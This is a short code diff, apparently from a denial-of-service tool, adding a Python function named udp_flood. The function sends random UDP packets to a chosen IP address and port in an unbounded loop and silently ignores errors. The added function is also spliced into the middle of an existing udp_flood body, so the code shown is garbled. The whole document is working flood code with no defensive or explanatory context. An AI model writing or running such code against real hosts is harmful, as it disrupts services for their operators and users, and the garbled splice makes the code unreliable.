@@ -10,6 +10,17 @@ def udp_flood(ip, port, packet_size, protocol="generic"):
     global packet_counter
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
+def udp_flood(ip, port, packet_size):
+    global packet_counter
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp_bytes = random._urandom(packet_size)
+    while not stop_event.is_set():
+        try:
+            sock.sendto(udp_bytes, (ip, port))
+            packet_counter += 1
+        except:
+            pass
+    
     if protocol == "generic":
         udp_bytes = random._urandom(packet_size)
     elif protocol == "dns":
